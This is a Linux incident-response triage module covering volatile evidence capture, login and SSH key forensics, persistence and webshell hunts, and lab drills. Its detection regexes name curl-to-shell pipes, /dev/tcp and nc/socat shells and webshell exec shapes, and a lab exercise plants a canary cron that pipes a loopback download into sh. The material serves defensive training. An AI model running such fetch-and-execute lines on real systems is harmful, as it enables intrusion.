---
name: aegis-dfir-triage-linux
description: First-60-120-minute DFIR triage for a suspected-compromised Linux host or Kubernetes node - volatile capture, session forensics, persistence and webshell sweeps, and the rebuild-versus-investigate decision.
category_slug: DFIR
cwe: []
owasp: N/A – Operational forensics
---

> **Adaptation note (this module remaps the fixed skill headings):** *What To Check* = the ordered triage sequence steps. *Where To Look* = artifact paths on disk. *Patterns & Signatures* = indicator shapes (webshell greps, deleted-exe signatures, suspicious-line examples). *Taint Tracing Guidance* = lateral-movement reading (which artifact implicates which next hop). *Exploitation & Reproduction* = TABLETOP walkthrough procedures on an owned, isolated lab host - explicitly never production. *Remediation* = eradication/rebuild actions. *Severity Assessment* = incident-impact classification aid, not CVSS scoring.

## Scope & Objectives

Apply this module to: suspicious ubuntu/fedora servers, bare-metal or cloud VMs, Kubernetes nodes, and hosts running internet-facing python/rust services behind cloudflare tunnels (cloudflared). Assume no EDR, no preinstalled forensics tooling, SSH access as an admin, and a small team with one responder on the keyboard.

Objectives, in order:

1. Preserve volatile evidence to an EXTERNAL collector before anything mutates the host.
2. Prove or disprove compromise within 60-120 minutes with concrete indicators.
3. Identify the entry-vector CLASS (webshell/upload, stolen SSH key, exposed admin surface, dependency compromise) well enough to patch and sweep the fleet.
4. Produce a defensible nuke-vs-investigate recommendation.
5. Hand a packaged finding set to the incident-response playbooks (`incident-response.md`).

Out of scope: full forensic disk analysis, malware reverse engineering, Windows/macOS hosts, formal legal chain of custody (this module provides LITE responder logging only).

## Prerequisites & Vocabulary

Zero-background primer: the terms this module uses, one line each. Deeper plain-language
explanations for every class live in the repository GUIDE.md glossary.

- **order of volatility**: capture RAM and network state first, because they die first
- **chain of custody**: a timestamped log of who touched which evidence and when
- **preserve before remediate**: collect evidence before cleanup, or you destroy the ability to prove what happened
- **webshell**: an attacker-planted script on the server granting remote commands
- **persistence mechanism**: anything keeping attacker access alive across reboots (cron jobs, SSH keys, timers)
- **externalize**: copy evidence to a remote collector — never write onto the suspect disk
- **nuke-vs-investigate**: the rebuild-from-clean versus deeper-forensics decision
- **taint flow / source→sink**: path untrusted data travels from entry point to dangerous function
- **finding status**: Confirmed > Probable > Needs-Review; evidence rules in templates/finding-report.md

## Mental Model

GOLDEN RULES - memorize before touching anything:

1. **PRESERVE BEFORE REMEDIATE.** Volatile state dies on reboot; evidence dies on cleanup. Killing "obviously evil" processes, deleting webshells, or rotating keys mid-triage destroys attribution data. Remediate only after capture, or when the containment decision is explicitly made and approved.
2. **EXTERNALIZE EVERYTHING.** Capture evidence to a remote collector you control (ssh/rsync streaming). Never write dumps, images, or scratch files onto the suspect filesystem - it mutates mtimes, overwrites deleted-file slack, and contaminates the image.
3. **LOG EVERY ACTION WITH TIMESTAMPS.** Your responder log is a lite chain of custody. UTC only, append-only, one line per action including deliberate no-actions.
4. **READ-ONLY FIRST.** Aggressive live response (module loads, agent installs, isolations that change attacker behavior) only when containment is already decided and approved by the incident lead.

ORDER OF VOLATILITY - work strictly top to bottom:

| # | State | Capture (exact commands) | Why it dies |
|---|-------|--------------------------|-------------|
| 1 | Network state | `ss -tunap`, `lsof -nP -i`, `ip neigh show`, `arp -an` | Sockets vanish on process exit or reboot; conntrack/neighbor tables are RAM-resident |
| 2 | Processes & memory | `ps auxfww`, `top -bn1`, `/proc/<pid>/{cmdline,cwd,exe,environ}`, LiME/AVML dump | Process exit frees pages; reboot erases RAM entirely |
| 3 | Logged-in sessions | `w`, `who`, `last -aF`, `lastlog` | utmp is rewritten on logout; wtmp/btmp rotate |
| 4 | Scheduled jobs (loaded view) | `systemctl list-timers --all`, `crontab -l`, `atq` | Attacker removes jobs the moment they suspect detection |
| 5 | Filesystem metadata | `find -newermt` sweeps, `stat`, package verifies | Cleanup scripts and `touch -r` timestomping erase trails |
| 6 | Logs | auth.log/secure, `journalctl`, nginx/app logs | Rotation, retention limits, attacker scrubbing; journald is often VOLATILE on minimal images |
| 7 | Backups/images | cloud volume snapshots, prior backup sets | Retention windows expire; post-compromise backups overwrite clean ones |

Memory-capture honesty: LiME (kernel module, streams LIME-format dumps, supports `path=tcp:<port>` network output) and AVML (Microsoft userland grabber) are the two standard Linux options. Loading a LiME module MUTATES kernel state (acceptable only when acquisition value outweighs it and approved); AVML avoids module load but writes a local temp file unless streamed, which strains Rule 2. If neither is already staged: SKIP memory gracefully, note it in the responder log, and prioritize the raw disk image later (step 2.9).

RESPONDER LOG TEMPLATE - start this file on YOUR laptop (never the suspect host) before step 1:

```text
UTC_TIMESTAMP | RESPONDER | HOST | ACTION | ARTIFACT_LOCATION | NOTES
2026-08-24T09:58Z | a.responder | host01 | triage-started | - | trigger: vendor alert + CF 5xx spike
2026-08-24T10:01Z | a.responder | host01 | volatile-capture | collector:/srv/evidence/host01-20260824T1000Z/ | see SHA256SUMS manifest
2026-08-24T10:14Z | a.responder | host01 | no-action-decision | - | did NOT kill pid 8812 pending approval
```

Discipline rules: UTC everywhere; record hashes of captured bundles (`SHA256SUMS` on the collector); log approvals and their grantor; log what you chose NOT to touch and why.

## What To Check

Work the steps in order. Every command below is read-only against the suspect host unless explicitly labeled otherwise. Timestamps in examples assume an incident window starting 2026-08-18 - substitute your real window.

### Step 0: Freeze and log (T+0, 2 minutes)

Do NOT reboot, do NOT kill processes, do NOT run cleanup/AV tools, do NOT "just patch it". Start the responder log (template above). Record: alert source, incident-window hypothesis, who approved the triage.

### Step 1: Containment posture check (read-only)

```bash
ss -tunap state established          # active sessions NOW
systemctl is-active cloudflared      # normal on this fleet - note config paths for later
```

If you see an active bulk transfer to a foreign IP or an interactive attacker session right now: page the incident lead BEFORE continuing - isolating changes attacker behavior (evidence tradeoff that needs a decision). Otherwise proceed; capture takes under 15 minutes.

### Step 2: Volatile capture (T+2..T+15)

Paste-ready starter. Streams everything off-host; nothing touches the suspect disk.

```bash
# ===== VOLATILE CAPTURE STARTER =====
# BIG WARNINGS:
#  * Run this shell ON the suspect host only AFTER starting your responder log.
#  * NOTHING here writes onto the suspect filesystem: every stream goes over SSH
#    to the external collector ($COLLECTOR). Never redirect output to local paths.
#  * Do NOT reboot, kill processes, or "clean up" before this completes.
# Prereq: key-based ssh FROM suspect TO collector. Verify first: ssh "$COLLECTOR" true
set -u
CASE_ID="$(hostname -s)-$(date -u +%Y%m%dT%H%M%SZ)"
COLLECTOR="responder@collector.internal"     # EDIT: user@evidence-server
RDIR="/srv/evidence/${CASE_ID}"              # path ON THE COLLECTOR, not locally
push() { ssh "$COLLECTOR" "mkdir -p '$RDIR' && cat > '$RDIR/$1'"; }  # writes land on collector only
ss -tunap                    | push ss-tunap.txt          # sudo if available: full pid visibility
ss -tunap state established  | push ss-established.txt
sudo lsof -nP -i             | push lsof-i.txt            # unprivileged run misses foreign sockets
ps auxfww                    | push ps-auxfww.txt
top -bn1                     | push top.txt
ip neigh show                | push ip-neigh.txt
arp -an                      | push arp-an.txt
w                            | push w.txt
last -aF -n 200              | push last-wtmp.txt
sudo last -f /var/log/btmp   | push last-btmp.txt         # failed-login history
lastlog                      | push lastlog.txt
for p in /proc/[0-9]*; do printf '%s\texe=%s\tcwd=%s\n' "${p#/proc/}" "$(readlink "$p/exe" 2>/dev/null)" "$(readlink "$p/cwd" 2>/dev/null)"; done | push proc-map.txt
sudo tar czf - /etc/cron* /var/spool/cron /etc/systemd/system /etc/profile.d /etc/passwd /etc/sudoers.d /etc/rc.local /etc/update-motd.d /home/*/.ssh /root/.ssh 2>/dev/null | push config-spot.tgz   # contains secrets: restrict collector perms
sudo journalctl -o short-iso --since "-48h" | push journal-48h.txt   # journald may be volatile: grab early
ssh "$COLLECTOR" "cd '$RDIR' && sha256sum * > SHA256SUMS && ls -la"
echo "DONE ${CASE_ID} -> ${COLLECTOR}:${RDIR}"
```

Extended volatile sequence (continue in order):

```bash
# 2.1 Extract foreign peers from the established map (IPv4 heuristic; eyeball v6 separately)
ss -tn state established | awk 'NR>1 {split($4,a,":"); print a[1]}' \
  | grep -vE '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|::1|fe80)' | sort | uniq -c | sort -rn
```

Interpretation: cloudflare edge IPs are EXPECTED for tunnel-fronted services. Flag: unknown VPS ranges, residential ASNs, repeated high-count connections, anything matching your own infra's outbound profile except approved package mirrors/APIs.

```bash
# 2.2 Process tree review (already saved). Flag:
#   web/server process spawning shells (nginx/python -> bash/sh), parents from /tmp//dev/shm,
#   defunct clusters, kworker-ish misspellings, single-letter binaries, high-CPU miners.
ps auxfww --sort=-%cpu | head -25
# 2.3 Per-process deep look for flagged PIDs: argv spoofing check + open files
tr '\0' ' ' < /proc/<PID>/cmdline; echo; sudo ls -l /proc/<PID>/{cwd,exe}; sudo ls /proc/<PID>/fd | wc -l
sudo cat /proc/<PID>/environ | tr '\0' '\n'    # secrets here drive credential rotation scope
# 2.4 Memory attempt ONLY if tooling already staged (see Mental Model honesty box):
sudo insmod lime.ko "path=tcp:4444 format=lime"        # ON SUSPECT HOST - mutates kernel state
ssh "$COLLECTOR" "nc -l -p 4444 > '$RDIR/mem.lime'"    # ON COLLECTOR, started FIRST
sudo rmmod lime.ko && echo "lime unloaded"             # still log the mutation in responder log
# 2.5 Evidence-critical path ONLY (Nuke-vs-Investigate says so): raw image streamed OFF-host.
#     Crashed-consistent image of a RUNNING filesystem - state that fact in the responder log.
sudo dd if=/dev/nvme0n1 bs=4M conv=noerror,sync status=progress | ssh "$COLLECTOR" "cat > '$RDIR/disk-nvme0n1.img'"
```

### Step 3: Login & session forensics (T+15..T+35)

FIRST ask the service owner for the known-admin list: expected source IPs, VPN/CGNAT ranges, CI systems. Everything outside that list is flagged. Do not skip this question - it converts noise into signal instantly.

```bash
# Debian/Ubuntu vs RHEL/Fedora auth logs; zcat covers rotated .gz
sudo grep -ahE 'Accepted (password|publickey)' /var/log/auth.log* /var/log/secure* 2>/dev/null \
  | grep -aoE 'from ([0-9]{1,3}\.){3}[0-9]{1,3}' | awk '{print $2}' | sort | uniq -c | sort -rn | head -25
sudo grep -ah 'Failed password' /var/log/auth.log* /var/log/secure* 2>/dev/null \
  | grep -aoE 'from ([0-9]{1,3}\.){3}[0-9]{1,3}' | awk '{print $2}' | sort | uniq -c | sort -rn | head -25
# Accepted events as user/IP pairs with counts - diff mentally against the known-admin list
sudo grep -ah 'Accepted' /var/log/auth.log* /var/log/secure* 2>/dev/null \
  | sed -E 's/.*(Accepted [a-z]+) for (invalid user )?([^ ]+) from ([^ ]+).*/\4 \3 \1/' | sort | uniq -c | sort -rn | head -30
```

Read `last`/`lastlog`/`who`: `last -aF` shows reboots, still-open sessions (no logout time = live or crash), and login sources; `lastlog` exposes accounts NEVER used since creation (dormant attacker-added users); `w` shows who is on RIGHT NOW - correlate with the ss-established map.

```bash
sudo last -f /var/log/wtmp -aF -n 400 | head -40     # explicit wtmp read
sudo last -f /var/log/btmp -aF -n 100 | head -20     # failures: brute-force sources pre-compromise
# sudo and su invocations timeline
sudo grep -ahE 'sudo:.*COMMAND=' /var/log/auth.log* /var/log/secure* 2>/dev/null | tail -60
journalctl _COMM=sudo -o short-iso --since "2026-08-18" --no-pager | tail -60
journalctl _COMM=su -o short-iso --since "2026-08-18" --no-pager | tail -40
# authorized_keys inventory + mtime window hunt across ALL homes incl. service accounts
sudo find / -xdev \( -path /proc -o -path /sys -o -path /snap \) -prune -o \
  -type f \( -name authorized_keys -o -name authorized_keys2 \) -printf '%TY-%Tm-%Td %TH:%TM %u:%g %p\n' 2>/dev/null | sort
sudo find /root /home /srv /opt -xdev -type f -name 'authorized_keys*' -newermt '2026-08-18' -ls 2>/dev/null
# account anomalies
awk -F: '($3==0) && ($1!="root") {print "UID0-NOT-ROOT:", $1}' /etc/passwd
sudo grep -ahE '(useradd|adduser|usermod|new users|password changed)' /var/log/auth.log* 2>/dev/null | tail -50
```

### Step 4: Persistence sweep (T+35..T+70)

Checklist format: location -> command -> what-bad-looks-like.

```bash
# 4.1 cron family
sudo grep -rn . /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /var/spool/cron 2>/dev/null | grep -avE '^[^:]+:\s*(#|$)'
sudo crontab -l -u root 2>/dev/null; for u in $(awk -F: '$3>=1000{print $1}' /etc/passwd); do sudo crontab -l -u "$u" 2>/dev/null | sed "s/^/[$u] /"; done
atq 2>/dev/null; sudo ls -la /var/spool/cron/atjobs /var/spool/at 2>/dev/null
```

BAD: `curl ...|sh`, `wget -O- ...|bash`, `base64 -d<<<...|bash`, `@reboot` entries you cannot attribute, jobs executing from `/tmp`, `/dev/shm`, `/var/tmp`, user crons on service accounts.

```bash
# 4.2 systemd units + timers: recent-mtime hunt beats name-guessing
systemctl list-timers --all --no-pager; systemctl list-units --type=service --state=running --no-pager
find /etc/systemd /usr/lib/systemd /run/systemd "$HOME/.config/systemd" -type f \
  -newermt '2026-08-18' -printf '%TY-%Tm-%Td %TH:%TM %p\n' 2>/dev/null | sort
```

BAD: any unit whose `ExecStart=` resolves into `/tmp`, `/dev/shm`, `/var/tmp`, `/home`; timers with tight `OnAccuracySec`/looping `OnCalendar` schedules; randomly-named services with `Restart=always`.

```bash
# 4.3 boot + shell init hooks
ls -l /etc/rc.local /etc/rc.d/rc.local 2>/dev/null && cat /etc/rc.local 2>/dev/null
ls -lat /etc/profile.d/ | head -15
test -e /etc/ld.so.preload && { echo 'PRELOAD FILE PRESENT = INVESTIGATE NOW'; sudo cat /etc/ld.so.preload; }
ls -la /etc/update-motd.d/
```

Rule: an existing `/etc/ld.so.preload` is not automatically malicious (some EDRs use it) but its presence ALWAYS justifies immediate inspection of every listed .so path against package ownership (`dpkg -S <path>` / `rpm -qf <path>`).

```bash
# 4.4 SSH server config tampering + all-user key review
sudo sshd -T 2>/dev/null | grep -Ei 'permitrootlogin|authorizedkeysfile|passwordauthentication|pubkeyauthentication'
sudo grep -r . /root/.ssh /home/*/.ssh /var/lib/*/.ssh /srv/*/.ssh 2>/dev/null | grep -a 'ssh-\|command='
```

BAD: `AuthorizedKeysFile` pointing off-standard, per-key `command="..."` wrappers that proxy to shells, keys with no comment or attacker-style comments, keys in service-account homes (postgres, www-data, git).

```bash
# 4.5 container + orchestrator autostart
docker ps -a --format '{{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Command}}' 2>/dev/null || echo no-docker
docker inspect --format '{{.Name}} restart={{.HostConfig.RestartPolicy.Name}} binds={{.HostConfig.Binds}}' $(docker ps -aq) 2>/dev/null
find /opt /srv /root /home -xdev -maxdepth 5 \( -name 'docker-compose*.y*ml' -o -name 'compose*.y*ml' \) -newermt '2026-08-18' -printf '%TY-%Tm-%Td %TH:%TM %p\n' 2>/dev/null
kubectl get cronjobs -A 2>/dev/null || echo no-kubectl-context-on-host
kubectl get pods -A -o wide 2>/dev/null | head -20
```

BAD: restart=always containers running shells/miners, compose files modified inside the window, k8s CronJobs with curl/bash images or unusual schedules.

```bash
# 4.6 world-writable exec drops + history hygiene
sudo find /tmp /var/tmp /dev/shm -xdev -type f -perm /111 -newermt '2026-08-18' -ls 2>/dev/null
ls -la /root/.bash_history /home/*/.bash_history 2>/dev/null    # zero-length history = possible HISTFILE evasion
sudo find /lib/modules/$(uname -r) -type f -name '*.ko*' -newermt '2026-08-01' -ls 2>/dev/null
```

### Step 5: Webshell & app-compromise hunt (T+70..T+100)

```bash
WEBROOTS="/var/www /srv /opt /usr/share/nginx/html"
# 5.1 mtime-window scan across common stacks
sudo find $WEBROOTS -xdev -type f \( -name '*.php' -o -name '*.py' -o -name '*.js' -o -name '*.jsp' -o -name '*.cgi' -o -name '.htaccess' \) \
  -newermt '2026-08-18' -printf '%TY-%Tm-%Td %TH:%TM %u:%g %p\n' 2>/dev/null | sort | tail -60
# 5.2 ripgrep battery over recently-modified files only (fast first pass)
sudo find $WEBROOTS -xdev -type f -newermt '2026-08-18' -print0 2>/dev/null \
  | sudo xargs -0 rg -n -i --no-ignore \
      -e 'eval\s*\(' -e 'base64_decode' -e 'gzinflate' -e 'str_rot13'
sudo find $WEBROOTS -xdev -type f -newermt '2026-08-18' -print0 2>/dev/null \
  | sudo xargs -0 rg -n -i --no-ignore \
      -e 'system\s*\(' -e 'passthru' -e 'shell_exec' -e 'proc_open' -e 'popen' \
      -e '__import__' -e 'importlib' -e 'os\.system' -e 'subprocess' -e 'child_process' -e 'Function\s*\('
```

Interpretation: one file combining a decode primitive + exec primitive + request-input access (`$_GET/$_POST/$_REQUEST`, `req.query`, `req.body`) IS a webshell until proven otherwise. Vendor code can match single patterns - combos in YOUR app code rarely lie.

```bash
# 5.3 upload directories deserve eyes-on regardless of mtime hits
sudo find $WEBROOTS -xdev -type d \( -iname '*upload*' -o -iname '*files*' -o -iname '*media*' -o -iname '*attachment*' \) 2>/dev/null
sudo ls -lat "$(sudo find $WEBROOTS -xdev -type d -iname '*upload*' 2>/dev/null | head -1)" 2>/dev/null | head -30
# 5.4 correlate: were suspicious files actually REQUESTED? POST then HTTP 200 = execution evidence
sudo zgrep -hE '(POST|GET) /(uploads|static|assets)/[^ ]+\.(php|py|jsp)' /var/log/nginx/access.log* /var/log/apache2/access.log* 2>/dev/null \
  | awk '$9==200 {print $7}' | sort | uniq -c | sort -rn | head -20
```

```bash
# 5.5 process->filesystem mapping for weird services (deleted-binary-running signature)
sudo ls -l /proc/[0-9]*/exe 2>/dev/null | grep -a deleted          # "(deleted)" suffix = RED FLAG
sudo ls -l /proc/[0-9]*/cwd 2>/dev/null | grep -aE '/tmp|/dev/shm|/var/tmp'   # services running out of tmp
```

### Step 6: Rootkit reality check (T+100..T+110)

Honest framing: these userland checks catch LAZY rootkits only. A kernel rootkit that subverts syscalls will hide from every command below. Their value: cheap, fast, catches low-effort persistence; negative results prove little.

```bash
lsmod | awk 'NR>1{print $1}' | while read -r m; do
  f=$(modinfo -n "$m" 2>/dev/null) || { echo "UNRESOLVED-MODULE: $m"; continue; }
  dpkg -S "$f" >/dev/null 2>&1 && continue
  rpm -qf "$f" >/dev/null 2>&1 && continue
  echo "MODULE-NOT-FROM-PKG: $m -> $f"
done
test -e /etc/ld.so.preload && sudo cat /etc/ld.so.preload
# sshd binary integrity vs package database ('5' in dpkg verify output column 1 = checksum mismatch)
dpkg -V openssh-server openssh-client sudo coreutils systemd 2>/dev/null     # deb hosts
rpm -V openssh-server openssh-clients sudo coreutils systemd 2>/dev/null     # rpm hosts
sha256sum /usr/sbin/sshd; debsums 2>/dev/null | grep -v OK                   # deb deep pass
rpm -Va 2>/dev/null | grep -av ' c '                                         # rpm full pass; ' c ' filters config-drift noise
rkhunter --check --sk 2>/dev/null    # OPTIONAL quick pass; FALSE-POSITIVE-HEAVY: treat as leads, never verdicts
chkrootkit 2>/dev/null               # OPTIONAL same caveat
```

### Step 7: Lite timeline (T+110..T+120)

Normalize sources to `<ISO8601><TAB>SOURCE<TAB>original-line`, merge, sort. Run on your WORKSTATION after pulling logs via the capture bundle:

```bash
# auth.log lines are syslog-formatted ("Aug 24 11:02:33"); pin the year manually (caveat near New Year)
grep -ahE 'Accepted|Failed|sudo' host-auth.log* | awk -v Y=2026 '
  BEGIN{split("Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec",M," ");for(i=1;i<=12;i++)Mo[M[i]]=sprintf("%02d",i)}
  {printf "%s-%s-%sT%s\tAUTH\t%s\n",Y,Mo[$1],$2,$3,$0}' > auth.iso
# journald short-iso exports are already near-target; normalize the captured text directly:
sed -E 's/^([0-9-]{10}T[0-9:]{8}) /\1\tSYS\t/' journal-48h.txt > sys.iso
sudo find /var/www /srv -xdev -newermt '2026-08-18' -printf '%FT%TT\tFS\t%p\n' 2>/dev/null > fs.iso
cat auth.iso sys.iso fs.iso | sort -t$'\t' -k1,1 | head -200
```

When time permits and the case escalates: escalate to plaso/log2timeline (`log2timeline.py` + `psort.py`) for super-timeline generation across artifact sets - it is the proper tool, this section is the triage-grade substitute.

## Where To Look

Consolidated artifact map for the triage steps above. Ubuntu path first, Fedora/RHEL variant second where they differ. All reads happen on the suspect host; copies land in the collector bundle from Step 2 - never annotate originals.

| Artifact | Path(s) | Triage value |
|----------|---------|--------------|
| Auth/session logs | `/var/log/auth.log*` / `/var/log/secure*` | Accepted/Failed logins, sudo COMMAND lines, useradd events |
| Login histories | `/var/log/wtmp`, `/var/log/btmp`, `/var/log/lastlog` | Session sources via `last(1)`; brute-force sources; dormant accounts |
| Journal (persistent) | `/var/log/journal/<machine-id>/` | Everything systemd logged; check `Storage=` in `/etc/systemd/journald.conf` |
| Journal (VOLATILE) | `/run/log/journal/` | If journals live here they die on reboot - capture in Step 2 FIRST |
| Cron system-wide | `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly,monthly}/` | Persistence class 1 |
| Cron per-user | `/var/spool/cron/crontabs/` / `/var/spool/cron/` | User-level persistence incl. service accounts |
| at jobs | `/var/spool/cron/atjobs/` / `/var/spool/at/` | One-shot delayed execution |
| systemd units | `/etc/systemd/system/`, `/run/systemd/system/`, `/usr/lib/systemd/system/`; user: `~/.config/systemd/user/` | Services + timers; mtime hunt beats name-guessing |
| Boot/init hooks | `/etc/rc.local`, `/etc/update-motd.d/`, `/etc/profile.d/`, `/etc/ld.so.preload` | Login-triggered persistence |
| SSH server config | `/etc/ssh/sshd_config`, `/etc/ssh/sshd_config.d/` | Redirected AuthorizedKeysFile, root-login policy changes |
| authorized_keys (ALL homes) | `/root/.ssh/`, `/home/*/.ssh/`, plus service accounts: `/var/lib/{postgres,www-data,git}/.ssh/`, `/srv/*/.ssh/` | Key-based backdoors |
| Webroots (this fleet) | `/srv/*`, `/opt/*`, `/var/www/`, nginx default `/usr/share/nginx/html/` | Webshells, planted files; confirm each service's real docroot from its unit `WorkingDirectory=` |
| Upload directories | `<webroot>/*upload*/`, `*media*/`, `*attachment*/` | Attacker drop zones |
| Reverse-proxy/app logs | `/var/log/nginx/access.log*`, `/var/log/apache2/access.log*`, app dirs under `/var/log/` | POST-to-new-file correlation, source IPs |
| Docker surfaces | `/var/lib/docker/containers/<id>/<id>-json.log*`, `docker ps -a`, `/var/run/docker.sock` perms | Rogue containers, socket exposure (world-writable sock = container-escape path) |
| Kubernetes surfaces | `/etc/kubernetes/manifests/`, `/var/lib/kubelet/`, `/var/log/pods/`, `kubectl get cronjobs -A` | Static-pod persistence, rogue CronJobs, pod logs offloaded to node disk |
| Tunnel daemon | `/etc/cloudflared/config.yml`, `/etc/systemd/system/cloudflared.service`, `~/.cloudflared/` | Ingress rewrites (`url:` pointing somewhere new), extra hostnames, token swaps |
| Package databases | `/var/lib/dpkg/` (+`status`), `/var/lib/rpm/` | Ground truth for `dpkg -S`/`rpm -qf` ownership checks |

Collector-side hygiene (H3): bundle name `<host>-<UTC timestamp>`; keep `SHA256SUMS`; chmod 700 the case dir - the Step 2 config tarball contains private keys and sudoers content; one case dir per host, never merged.

## Patterns & Signatures

Indicator shapes for everything Steps 3-5 hunt for. All regexes are ripgrep-compatible. Single matches are leads; a file combining decode + exec + request-input access is a verdict.

### Webshell combo battery

```regex
# PHP decode+exec combos (the classic shapes)
eval\s*\(\s*(base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(
(base64_decode|str_rot13)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)
(preg_replace\s*\(.*/e|assert\s*\(|create_function\s*\()
file_put_contents\s*\(.{0,80}\$_(GET|POST|REQUEST)
```

```regex
# Python stack exec primitives reachable from request input
(__import__|importlib\.import_module)\s*\(\s*(base64|codecs)\.
os\.(system|popen)|subprocess\.(call|run|Popen|check_output)
getattr\s*\(\s*__builtins__\s*,.{0,30}\)\s*\(
exec\s*\(\s*(compile\s*\()?\s*base64
```

```regex
# Node/JS and generic CGI shapes (some stacks front python services)
child_process|Function\s*\(\s*['"]return\s+process
new\s+Function\s*\(|eval\s*\(\s*(atob|Buffer\.from)
```

Rust services are rarely webshelled directly - watch instead for command-invocation wired to request params in handler code:

```regex
std::process::Command::new|Command::new\([^)]{0,60}\)\.(arg|output|status)\(
```

### Running-deleted-binary signature

```regex
\(deleted\)$
```

Output shape: `ls -l /proc/<pid>/exe` ending `(deleted)` means the binary on disk was replaced or removed while the process kept running - normal for package upgrades, abnormal for anything started outside a maintenance window. Correlate PID start time (`ps -o lstart= -p <pid>`) against apt/dnf history (`/var/log/apt/history.log*`, `/var/log/dnf.log*`) before flagging.

### SSH key comment shapes

```regex
^ssh-(rsa|ed25519) [A-Za-z0-9+/=]{80,}\s*$          # no comment at all
command="[^"]*(bash|/bin/sh|nc |ncat|socat)[^"]*"    # forced-command proxying to shells
^no-port-forwarding[^\n]{0,10}$                      # option-stripped oddities
```

Legit deploy keys carry owner comments (`deploy@ci01`). Blank-comment keys, or any key in postgres/www-data/git homes, get flagged then attributed against the known-admin list from Step 3.

### Cron/unit payload one-liners

Applies to crontab lines AND `ExecStart=`/`ExecStartPre=` inside units:

```regex
(curl|wget)\s[^|\n]*\|\s*(ba|z|da)?sh\b
@reboot\s+(curl|wget|python3?|perl)\b
base64\s+-d\s*(<<<|<<)
python3?\s+-c\s+['"].{0,100}(socket|urllib|requests|pty\.spawn)
perl\s+-e\s+['"].{0,80}socket
/dev/tcp/
```

### Access-log POST-to-new-file correlation

The execution-evidence shape: a request to a file that did not exist in your deploy manifest, followed by HTTP 200:

```regex
"(POST|GET)\s+/[^"]*\.(php|jsp|asp|aspx|py|cgi)(\?[^"]*)?"\s+200
```

Workflow: list candidate files from the Step 5 mtime sweep -> grep this shape for each filename -> any 200 hit means it RAN, not merely landed. A 404-only history means the file was found by scanners but likely never executed (see Common False Positives).

### New-user / UID-0 passwd lines

```regex
^[^:\n]+:[^:]*:0:0:[^:]*:[^:]*:[^:\n]*$      # any UID 0 beyond root's own line
^[^:\n]+:[^:]*:(1[0-9]{3}|[2-9][0-9]{3}):.*:/bin/(ba)?sh$   # high-UID account with interactive shell
```

Run against the CAPTURED copy of `/etc/passwd` (collector bundle), not just live - then diff against the same file from your IaC repo or a known-good sibling host.

## Taint Tracing Guidance

Every finding answers "where did the attacker come from, and what did they touch next". Follow the chain until you hit infrastructure you do not control; then package IOCs and hand off (see incident-response.md). Do not stop at the first hop - a webshell found is an entry vector NOT yet identified.

| Artifact finding | What it implicates | Next hop to pull |
|------------------|--------------------|------------------|
| Unknown key in `authorized_keys` | Key-based access from an external host | sshd logs the key SHA256 fingerprint on accept: grep that fingerprint across `auth.log*`/`secure*` on ALL fleet hosts -> every host it appears on becomes a triage target |
| Cron payload URL | Egress IOC + staging server | Extract full URL; sweep proxy/CF logs for who fetched or planted it; check whether any OTHER host resolves or fetches it (fleet-wide cron grep) |
| Webshell in webroot | Unpatched app vuln upstream + attacker client IP | Pull access-log lines for the file's exact path back to its creation (mtime anchor); the FIRST 200 after upload window identifies operator IP and likely the upload request itself |
| Container escape markers (host-path bind mounts written from container context, kernel modules loaded after container start, processes whose cgroup maps to a pod but exe lives on node fs) | NODE compromise - assume the node, not just the workload | Node-level Step 4 persistence sweep is mandatory; rotate the pod's ServiceAccount tokens; treat sibling pods on the node as exposed |
| cloudflared tampering (extra ingress hostname, rewritten `url:`, replaced service binary/token) | Edge trust loss - tunnel credentials abused | Assume ANY internal service reachable via that tunnel was reachable to the attacker; audit Cloudflare audit logs, rotate tunnel token, diff config against IaC truth |
| SSH key reused across hosts | Fleet-scale lateral movement | Fingerprint search (above) + cross-ref secrets-data-exposure.md: the SAME key material may sit in repos, images, or backups |

Stop conditions: chain ends at (a) an external system you cannot log into (hand the IP/domain/timestamps to IR for takedown/abuse reports), (b) a credential you control (rotate per Remediation cascade), or (c) your own IaC (fix the source).

## Exploitation & Reproduction

TABLETOP ONLY. Everything below happens on an owned, isolated lab VM you control - no public NIC, never production, never a customer system. Purpose: rehearse this module's steps until the hunts are muscle memory. Revert the VM to its pre-exercise snapshot when done (cleanup by revert, not by hand).

Lab prereqs: isolated Ubuntu/Fedora VM, snapshot taken NOW labeled `pre-dfir-drill`, a non-admin user (`useradd -m labuser`), python3 installed.

### Exercise A: canary cron

Plant it:

```bash
# ON THE LAB VM ONLY
sudo tee /tmp/.sys-update-check.sh >/dev/null <<'EOF'
#!/bin/sh
# CANARY stand-in payload: no network, no effect beyond logging its own run
logger -t canary-cron "canary executed $(date -u)"
EOF
sudo chmod 755 /tmp/.sys-update-check.sh
( sudo crontab -l 2>/dev/null; echo '@reboot /tmp/.sys-update-check.sh' ) | sudo crontab -
( sudo crontab -l 2>/dev/null; echo '*/15 * * * * curl -s http://127.0.0.1:9/canary.tgz | sh' ) | sudo crontab -
```

Find it using ONLY module steps: run the Step 4.1 cron battery until both entries surface; note which single command would have caught them fleet-wide.

### Exercise B: canary SSH key

Plant it:

```bash
ssh-keygen -t ed25519 -N '' -C '' -f ~/lab-attacker-key    # empty comment = suspicious shape by design
sudo mkdir -p /home/labuser/.ssh
sudo sh -c 'cat ~/lab-attacker-key.pub >> /home/labuser/.ssh/authorized_keys'
```

Find it: Step 3 authorized_keys inventory (mtime hunt catches the touched file), then Step 4.4 all-user key review, then match against the no-comment regex in Patterns & Signatures. Practice reading `lastlog` to notice `labuser` as a dormant account.

### Exercise C: inert canary webshell

The canary contains signature strings ONLY - nothing executes. Plant it:

```bash
sudo mkdir -p /srv/labapp/static/uploads
sudo tee /srv/labapp/static/uploads/img_helper.py >/dev/null <<'EOF'
# INERT CANARY: signature strings only; nothing here runs anything.
PAYLOAD_SHAPE = "__import__('os').system('id'); base64.b64decode"
EOF
```

